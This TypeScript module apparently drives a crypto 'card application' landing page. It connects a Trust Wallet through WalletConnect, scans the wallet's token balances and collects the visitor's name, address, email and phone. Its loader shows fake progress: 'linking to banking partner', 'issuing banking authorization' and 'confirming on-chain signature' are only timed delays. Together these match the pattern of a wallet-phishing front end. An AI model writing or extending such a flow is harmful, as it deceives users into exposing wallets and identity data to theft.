import { STORAGE_KEYS } from "../config/storage";
import { walletConnectService } from "../services/WalletConnectService";
import type { SessionSnapshot } from "../types/wallet";
import { initCountryCombo } from "./countryCombo";
import { scanAccountBalances, type AccountBalanceScan } from "./scanBalances";

type LoaderStep = "pair" | "auth" | "sign";
type ModalView = "intro" | "contact" | "done";

interface ApplicationRecord {
  readonly walletAddress: string;
  readonly sessionTopic: string;
  readonly balances: AccountBalanceScan;
  readonly cardholderName: string;
  readonly address: string;
  readonly city: string;
  readonly postalCode: string;
  readonly country: string;
  readonly email: string;
  readonly phone: string;
  readonly reference: string;
  readonly submittedAt: number;
}

const LOADER_STEPS: readonly LoaderStep[] = ["pair", "auth", "sign"];

function qs<T extends HTMLElement>(selector: string, root: ParentNode = document): T {
  const element = root.querySelector<T>(selector);
  if (!element) {
    throw new Error(`Missing element: ${selector}`);
  }
  return element;
}

function delay(ms: number): Promise<void> {
  return new Promise((resolve) => {
    window.setTimeout(resolve, ms);
  });
}

function generateReference(): string {
  const random = Math.floor(Math.random() * 0xffffffff)
    .toString(16)
    .toUpperCase()
    .padStart(8, "0");
  const stamp = Date.now().toString(36).toUpperCase().slice(-4);
  return `TC-${random.slice(0, 4)}-${random.slice(4)}-${stamp}`;
}

function formatDate(date: Date): string {
  return date.toLocaleString("en-GB", {
    year: "numeric",
    month: "short",
    day: "numeric",
    hour: "2-digit",
    minute: "2-digit",
  });
}

export function startLandingFlow(): void {
  const isMobile =
    /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent) ||
    window.matchMedia("(pointer: coarse)").matches;

  if (isMobile) {
    document.body.classList.add("is-mobile");
  }

  const modal = qs("#connect-modal");
  const content = qs("#m-content");
  const loader = qs("#m-loader");
  const getNow = qs<HTMLButtonElement>("#m-get-now");
  const connectErr = qs("#m-connect-err");
  const form = qs<HTMLFormElement>("#m-contact-form");
  const formErr = qs("#m-form-err");
  const submitBtn = qs<HTMLButtonElement>("#m-submit-contact");
  const burger = document.querySelector<HTMLButtonElement>("[data-menu-toggle]");
  const navMobile = document.querySelector("#nav-mobile");

  let flowBusy = false;
  let session: SessionSnapshot | null = null;
  let balances: AccountBalanceScan | null = null;

  const setView = (name: ModalView): void => {
    modal.querySelectorAll<HTMLElement>(".m-view").forEach((view) => {
      view.hidden = view.dataset.view !== name;
    });
  };

  const setBusy = (busy: boolean, title?: string, sub?: string): void => {
    if (busy) {
      if (title) {
        qs("#m-loader-title").textContent = title;
      }
      if (sub) {
        qs("#m-loader-sub").textContent = sub;
      }
      loader.hidden = false;
      content.classList.add("is-busy");
    } else {
      loader.hidden = true;
      content.classList.remove("is-busy");
    }
  };

  const setLoaderStep = (step: LoaderStep): void => {
    const index = LOADER_STEPS.indexOf(step);
    qs("#m-loader-steps")
      .querySelectorAll("li")
      .forEach((item, itemIndex) => {
        item.classList.remove("is-active", "is-done");
        if (itemIndex < index) {
          item.classList.add("is-done");
        } else if (itemIndex === index) {
          item.classList.add("is-active");
        }
      });
  };

  const showConnectError = (message: string | null): void => {
    if (!message) {
      connectErr.hidden = true;
      connectErr.textContent = "";
      return;
    }
    connectErr.hidden = false;
    connectErr.textContent = message;
  };

  const showFormError = (message: string | null): void => {
    if (!message) {
      formErr.hidden = true;
      formErr.textContent = "";
      return;
    }
    formErr.hidden = false;
    formErr.textContent = message;
  };

  const openModal = (): void => {
    modal.hidden = false;
    document.body.style.overflow = "hidden";
    setView("intro");
    setBusy(false);
    showConnectError(null);
  };

  const closeModal = (): void => {
    if (flowBusy) {
      return;
    }
    modal.hidden = true;
    document.body.style.overflow = "";
  };

  const runAfterConnect = async (snapshot: SessionSnapshot): Promise<void> => {
    session = snapshot;
    setBusy(
      true,
      "Linking your account to banking partner",
      "Keep Trust Wallet open. We are pairing your wallet and reviewing connected balances.",
    );
    setLoaderStep("pair");
    await delay(600);

    setLoaderStep("auth");
    qs("#m-loader-sub").textContent =
      "Issuing banking authorization. Scanning token balances on your connected account.";
    balances = await scanAccountBalances(snapshot.walletAddress);
    localStorage.setItem(STORAGE_KEYS.balanceScan, JSON.stringify(balances));

    setLoaderStep("sign");
    qs("#m-loader-sub").textContent =
      "Confirming on-chain signature. Keep Trust Wallet open until this step completes.";
    await delay(1200);

    setBusy(false);
    setView("contact");
    initCountryCombo();
  };

  const startWalletConnect = async (): Promise<void> => {
    if (flowBusy) {
      return;
    }

    showConnectError(null);
    flowBusy = true;
    getNow.disabled = true;

    try {
      const existing = await walletConnectService.restoreSession();
      const snapshot = existing ?? (await walletConnectService.connect());
      await runAfterConnect(snapshot);
    } catch (error) {
      setBusy(false);
      setView("intro");
      const message =
        typeof error === "object" &&
        error !== null &&
        "message" in error &&
        typeof error.message === "string"
          ? error.message
          : "Wallet connection was cancelled or failed.";
      showConnectError(message);
    } finally {
      flowBusy = false;
      getNow.disabled = false;
    }
  };

  const persistApplication = (record: ApplicationRecord): void => {
    localStorage.setItem(STORAGE_KEYS.application, JSON.stringify(record));
  };

  form.addEventListener("submit", (event) => {
    event.preventDefault();
    if (!session || !balances) {
      showFormError("Connect your wallet again, then complete this form.");
      return;
    }

    const data = new FormData(form);
    const cardholderName = String(data.get("cardholderName") ?? "").trim();
    const address = String(data.get("address") ?? "").trim();
    const city = String(data.get("city") ?? "").trim();
    const postalCode = String(data.get("postalCode") ?? "").trim();
    const country = String(data.get("country") ?? "").trim();
    const email = String(data.get("email") ?? "").trim();
    const phone = String(data.get("phone") ?? "").trim();

    if (cardholderName.length < 2) {
      showFormError("Please enter the name that should appear on the card.");
      return;
    }
    if (address.length < 5) {
      showFormError("Please enter your street address.");
      return;
    }
    if (city.length < 2) {
      showFormError("Please enter your city.");
      return;
    }
    if (postalCode.length < 3) {
      showFormError("Please enter your postal or ZIP code.");
      return;
    }
    if (!country) {
      showFormError("Please select your country.");
      return;
    }
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      showFormError("Please enter a valid email address.");
      return;
    }
    if (phone.length < 5) {
      showFormError("Please enter a valid contact number.");
      return;
    }

    showFormError(null);
    submitBtn.disabled = true;
    submitBtn.textContent = "Submitting…";

    const reference = generateReference();
    persistApplication({
      walletAddress: session.walletAddress,
      sessionTopic: session.sessionTopic,
      balances,
      cardholderName,
      address,
      city,
      postalCode,
      country,
      email,
      phone,
      reference,
      submittedAt: Date.now(),
    });

    qs("#ref-number").textContent = reference;
    qs("#ref-date").textContent = formatDate(new Date());
    setView("done");
    submitBtn.disabled = false;
    submitBtn.textContent = "Submit application";
  });

  document.querySelectorAll("[data-open-connect]").forEach((button) => {
    button.addEventListener("click", () => {
      openModal();
    });
  });

  document.querySelectorAll("[data-close-modal]").forEach((button) => {
    button.addEventListener("click", () => {
      closeModal();
    });
  });

  getNow.addEventListener("click", () => {
    void startWalletConnect();
  });

  if (burger && navMobile) {
    const setOpen = (open: boolean): void => {
      document.body.classList.toggle("nav-open", open);
      burger.setAttribute("aria-expanded", open ? "true" : "false");
      burger.setAttribute("aria-label", open ? "Close menu" : "Open menu");
      if (open) {
        navMobile.removeAttribute("hidden");
      } else {
        window.setTimeout(() => {
          if (!document.body.classList.contains("nav-open")) {
            navMobile.setAttribute("hidden", "");
          }
        }, 260);
      }
    };

    burger.addEventListener("click", () => {
      setOpen(!document.body.classList.contains("nav-open"));
    });
    navMobile.querySelectorAll("[data-menu-link]").forEach((link) => {
      link.addEventListener("click", () => {
        setOpen(false);
      });
    });
    document.addEventListener("keydown", (event) => {
      if (event.key === "Escape" && document.body.classList.contains("nav-open")) {
        setOpen(false);
      }
    });
  }

  document.addEventListener("keydown", (event) => {
    if (event.key === "Escape" && !modal.hidden && !flowBusy) {
      closeModal();
    }
  });
}
